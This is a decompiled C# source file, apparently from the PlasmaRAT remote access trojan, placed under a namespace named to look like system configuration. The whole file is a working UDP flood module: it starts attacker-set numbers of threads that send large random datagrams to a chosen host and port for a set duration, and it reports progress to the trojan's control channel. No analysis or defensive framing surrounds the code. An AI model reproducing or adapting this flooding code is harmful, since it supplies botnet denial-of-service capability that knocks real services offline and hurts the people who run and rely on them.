using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x0200000B RID: 11
	[StandardModule]
	public sealed class UDP
	{
		// Token: 0x06000028 RID: 40 RVA: 0x00003D98 File Offset: 0x00001F98
		public static void StartUDP(string Host, int Threadsto, int Time, int Ports)
		{
			if (!UDP.AttackRunning)
			{
				UDP.AttackRunning = true;
				UDP.HostToAttack = Host;
				UDP.Port = Ports;
				UDP.ThreadstoUse = Threadsto;
				UDP.TimetoAttack = Time;
				UDP.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"UDP Attack on ",
					UDP.HostToAttack,
					":",
					UDP.Port.ToString(),
					" Started!"
				}), "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					UDP.Threads[i] = new Thread(new ThreadStart(UDP.DoWork));
					UDP.Threads[i].IsBackground = true;
					UDP.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A UDP Attack is Already Running on " + UDP.HostToAttack + ":" + UDP.Port.ToString(), "");
			}
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003EAC File Offset: 0x000020AC
		private static void lol()
		{
			UDP.ThreadsEnded = Operators.AddObject(UDP.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(UDP.ThreadsEnded, UDP.ThreadstoUse, false))
			{
				UDP.ThreadsEnded = 0;
				UDP.ThreadstoUse = 0;
				UDP.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"UDP Attack on ",
					UDP.HostToAttack,
					":",
					UDP.Port.ToString(),
					" finished successfully. Packets Sent: ",
					UDP.attacks.ToString()
				}), "");
				UDP.attacks = 0;
			}
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003F70 File Offset: 0x00002170
		public static void StopUDP()
		{
			if (UDP.AttackRunning)
			{
				int num = 0;
				int num2 = UDP.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						UDP.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				UDP.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"UDP Attack on ",
					UDP.HostToAttack,
					":",
					UDP.Port.ToString(),
					" aborted successfully. Packets Sent: ",
					UDP.attacks.ToString()
				}), "");
				UDP.attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No UDP Attack is Running!", "");
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00004050 File Offset: 0x00002250
		private static void DoWork()
		{
			try
			{
				Random random = new Random();
				byte[] array = new byte[65500];
				int num = 0;
				do
				{
					array[num] = (byte)random.Next(0, 255);
					num++;
				}
				while (num <= 65499);
				TimeSpan t = TimeSpan.FromSeconds((double)UDP.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(UDP.HostToAttack), UDP.Port);
				while (stopwatch.Elapsed < t)
				{
					try
					{
						Socket[] array2 = new Socket[num + 1];
						array2[num] = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
						array2[num].SendTo(array, remoteEP);
						UDP.attacks++;
						array2[num].Close();
						Thread.Sleep(100);
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			UDP.lol();
		}

		// Token: 0x04000034 RID: 52
		private static object ThreadsEnded = 0;

		// Token: 0x04000035 RID: 53
		private static string HostToAttack;

		// Token: 0x04000036 RID: 54
		private static int TimetoAttack;

		// Token: 0x04000037 RID: 55
		private static int ThreadstoUse;

		// Token: 0x04000038 RID: 56
		private static int Port;

		// Token: 0x04000039 RID: 57
		private static Thread[] Threads;

		// Token: 0x0400003A RID: 58
		private static bool AttackRunning = false;

		// Token: 0x0400003B RID: 59
		private static int attacks = 0;
	}
}
